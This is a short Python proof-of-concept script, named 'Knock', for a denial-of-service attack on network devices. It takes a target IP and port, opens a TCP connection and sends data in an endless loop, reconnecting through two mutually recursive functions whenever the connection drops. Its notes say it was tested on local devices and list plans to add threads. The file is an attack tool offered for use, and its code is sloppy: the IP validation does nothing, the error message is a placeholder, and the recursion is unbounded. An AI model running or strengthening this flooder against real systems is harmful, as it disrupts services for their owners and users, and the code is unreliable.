"""
    Knock

    PoC for DoS attack on network device.

    [X]Test against local devices (PiHole DNS, mobile phone)
    [ ]Add threads
    [ ]add port checks
    

    
"""

import sys
import socket


def knock(ipaddr: str, port: int):
    print("starting knock")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("created socket")
    client.connect((ipaddr, port))
    print("created connection")
    while True:
        try:
            client.send('knock'.encode())
        except (ConnectionAbortedError, ConnectionResetError) as e:
            print("Error of {3}")
            knock2(ipaddr,port)

def knock2(ipaddr: str, port: int):
    print("starting knock")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("created socket")
    client.connect((ipaddr, port))
    print("created connection")
    while True:
        try:
            client.send('knock knock'.encode())
        except (ConnectionAbortedError, ConnectionResetError) as e:
            print("Error of {3}")
            knock(ipaddr,port)
    

def validateIP(ipaddr: str):
    return ipaddr

def validatePort(port: int):
    assert type(port) == int
    if port > 0 and port < 65535:
        return port

def startKnocking():
    ipaddr = validateIP(input("Give an ip address"))
    
    port = validatePort(int(input("Give a port")))
    
    knock(ipaddr,port)

if __name__ == "__main__":
    startKnocking()
    